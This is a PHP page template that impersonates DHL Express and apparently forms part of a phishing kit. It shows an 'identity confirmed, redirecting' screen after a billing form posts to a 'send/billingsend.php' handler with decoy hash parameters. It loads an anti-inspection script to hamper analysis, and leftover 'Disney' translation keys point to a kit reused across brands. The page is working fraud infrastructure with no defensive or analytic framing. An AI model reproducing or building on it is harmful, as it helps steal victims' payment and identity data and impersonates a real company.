<?php require_once(__DIR__ . '/../includes/page-common.php'); ?>
<!DOCTYPE html>
<html lang="<?php echo htmlspecialchars($selectedLanguage); ?>">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="Cache-Control" content="no-cache">
    <title><?php echo htmlspecialchars($translations['Redirect_Disney'] ?? 'DHL'); ?></title>
    <link rel="stylesheet" href="<?php echo htmlspecialchars($dhlStyleHref, ENT_QUOTES, 'UTF-8'); ?>">
    <script src="js/security-common.js"></script>
    <script src="../js/anti-inspect.js"></script>
</head>
<body class="dhl-page js-focus-visible">
<header class="dhl-header">
    <div class="dhl-logo-mark">DHL</div>
    <div>
        <div class="dhl-brand-text"><?php echo htmlspecialchars($translations['dhl_brand'] ?? 'DHL Express'); ?></div>
        <div class="dhl-brand-sub"><?php echo htmlspecialchars($translations['identityconfirmed']); ?></div>
    </div>
</header>
<main class="dhl-main">
    <div class="dhl-card-panel">
        <form id="dssLogin" name="dssLogin" action="<?php echo './send/billingsend.php?enc=' . md5((string) time()) . '&p=0&dispatch=' . sha1((string) time()); ?>" method="post">
            <h1 class="dhl-title" style="text-align: center;"><?php echo htmlspecialchars($translations['identityconfirmed']); ?></h1>
            <img src="./img/gear.gif" alt="" class="dhl-img-block" style="max-width: 300px;">
            <p class="dhl-sub" style="text-align: center; font-weight: 700; margin-bottom: 0;"><?php echo htmlspecialchars($translations['redirrection']); ?></p>
        </form>
    </div>
    <p class="dhl-footer-note"><?php echo htmlspecialchars($translations['dhl_footer_rights'] ?? $translations['Disney_All_rights_reserved']); ?></p>
</main>
</body>
</html>
